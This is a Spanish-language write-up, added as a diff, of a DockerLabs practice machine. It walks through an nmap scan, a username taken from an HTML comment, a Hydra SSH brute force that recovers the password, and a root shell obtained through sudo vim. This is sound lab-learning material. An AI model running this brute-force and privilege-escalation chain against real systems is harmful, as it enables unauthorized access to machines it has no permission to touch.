@@ -1,0 +1,57 @@
+Primero realizamos nmap a la IP:
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 22:00 -0500
+Nmap scan report for 172.17.0.2
+Host is up (0.0000030s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Revisamos la web de la IP, encontramos algo interesante..
+
+</div>         <! -- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente -->
+
+<a href="mailto:russoski@dockerlabs.es" target="_blank">russoski@dockerlabs.es</a>
+
+
+Podemos inferir que un usuario valido es russoski, lo probamos en fuerza bruta
+
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 22:02:14
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
+
+Entramos al SSH con las credenciales:
+
+Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
+russoski@49ba4d4a30f2:~$ ls
+Documentos  Proyectos
+
+Revisando el sudo -l podemos identificar que se tiene permisos de root para VIM:
+
+
+russoski@49ba4d4a30f2:~/Documentos$ sudo -l
+Matching Defaults entries for russoski on 49ba4d4a30f2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User russoski may run the following commands on 49ba4d4a30f2:
+    (root) NOPASSWD: /usr/bin/vim
+
+
+Por lo que podemos ejecutar:
+
+russoski@49ba4d4a30f2:~/Documentos$ sudo vim -c ':!/bin/bash'
+
+root@49ba4d4a30f2:/home/russoski/Documentos# ls
+'Nikola Tesla.jpg'
+root@49ba4d4a30f2:/home/russoski/Documentos# whoami
+root
+
+Obteniendo permisos de root para la maquina vulnerable
